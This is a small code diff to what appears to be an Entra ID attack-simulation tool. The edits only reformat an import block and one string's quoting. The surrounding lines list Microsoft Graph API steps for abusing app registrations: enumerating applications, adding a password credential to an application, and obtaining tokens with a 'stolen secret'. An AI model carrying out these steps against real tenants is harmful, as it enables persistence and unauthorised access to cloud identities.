@@ -17,6 +17,7 @@ from typing import Any
 
 try:
     import requests
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
@@ -226,7 +227,7 @@ class EntraIDAttackEngine:
             "graph_api_commands": [
                 "GET /applications?$select=id,displayName,requiredResourceAccess",
                 "GET /servicePrincipals?$select=id,appDisplayName,appRoles",
-                "POST /applications/{app_id}/addPassword -d '{\"passwordCredential\": {\"displayName\": \"Test\"}}'",
+                'POST /applications/{app_id}/addPassword -d \'{"passwordCredential": {"displayName": "Test"}}\'',
                 "POST /oauth2/v2.0/token with client_credentials grant using stolen secret",
             ],
         }
